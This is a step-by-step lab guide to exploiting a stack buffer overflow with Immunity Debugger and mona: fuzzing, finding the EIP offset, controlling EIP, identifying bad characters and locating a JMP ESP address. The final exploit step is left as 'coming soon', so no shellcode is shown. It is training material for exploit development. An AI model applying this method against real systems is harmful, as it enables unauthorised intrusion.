# Buffer Overflow in 7 steps

This is a quick 7 step guide on how to go about exploiting a buffer overflow vulnerability, this guide will pretty much serve as a checklist to help you stay on the right path for each step and to get through the exloit a lot faster, prior knowledge on how to exploit this vulnerbility is definitely recommended.

<h2> Lab Setup </h2>
<h4> Remote Desktop into the debugging machine: </h4> 

`xfreerdp /u:admin /p:lab /cert:ignore /v:192.168.xx.xxx` </br>

<h4> configuring !mona on immunity debugger:</h4> 

`!mona config -set workingfolder c:\mona\%p` </br>
(note down the path for later) </br>
`!mona bytearray -b "\x00"` </br>

# Buffer Overflow

<h2> STEP 1 Fuzzing [poc.py] </h2>
Assuming a fuzzing script was already given, just change the ip and port to that of the debugging machine, then execute it and take note of where the app crashes, for example:

`3000 bytes`</br>

<h2> STEP 2 Crashing The App [poc2.py] </h2>
For the sake of keeping things neat and tidy, create a new script for each change made, in this case, create a script called <b>poc2.py</b>, with the same contents of <b>poc.py</b>, the only difference is that a bytearray will be sent as the payload, to generate the bytearray, use the following command with the number of bytes it took to crash the app, 3000 bytes in this case.

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000`

<h2> STEP 3 Finding The EIP Offset </h2>
While still using poc2.py, the app should crash at exactly 3000 bytes everytime, while immunity debugger is in its "crashed state", input the following !mona command to find the EIP:

`!mona findmsp -distance 3000` </br>
Take note of the cyclic pattern, this will be the EIP, in this case: </br>
`cyclic pattern 1545`


<h2> STEP 4 Controlling The EIP [poc3.py] </h2>
Create a new script called <b>poc3.py</b> based off <b>poc.py</b>, change the payload buffer to the following:

`buffer = "A" * 1545 + "B" * 4 + "C" * 100` </br>
what this will do is send a buffer of A's equal to the EIP offset, in this case 1545 bytes, then write 4 B's to the EIP, followed by 100 C's after the EIP, the reason for the 100 C's is to show if there will be enough space for the shell code to be written.


<h2> STEP 5 Finding Bad Characters [poc4.py] </h2>
Create a new script called <b>poc4.py</b> based off <b>poc.py</b>, a new "badchar" variable must be added to this script, this is where an entire bytearray will be send in order to find bad characters. poc4.py should have a variable that looks like the following:

`
buffer = "A" * offset + "B" * 4` </br>
`badchars = "/x01..."`

The contents inside the badchar varaible is a bytearray which can be copied & pasted:
`\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff` </br>

Everytime poc4.py is executed, the app will crash at the bad character, in order to identify the bad character(s), view immunity bugger in its "crashed state", then right click on the ESP and follow the dump, from here manually follow the order of the bytearray (as shown above) and identify where the pattern gets distorted, then remove that character from poc4.py, then resent the script. Repeat the process until the bytearray pattern is shown in order without being distorted. Make sure to note down all the badchars that was found, it will be used in the next step, in this case: </br>
`badchars = \x05\x22\x3a\x91\xc0\xb3` </br>

<h2> STEP 6 Finding The JMP Point </h2>

Using the badchars found in the previous step along with !mona, the JMP point can be found by utilizing the following command: </br>
`!mona jmp -r esp -cpb "\x05\x22\x3a\x91\xc0\xb3"` </br>
A result similar to this should be displayed: </br>
`59527682` </br>
The next step is to take the result above and convert it to <b>little endian format</b>, this can be done by reversing the order and placing it in hex format as shown below: </br>
`little endian = \x82\x76\x52\x59` </br>
The above variable will now be the JMP Point (JMP ESP)


<h2> STEP 7 [exploit.py] </h2>
This is the final script, a few variables need to be added: </br>

# Coming soon









 

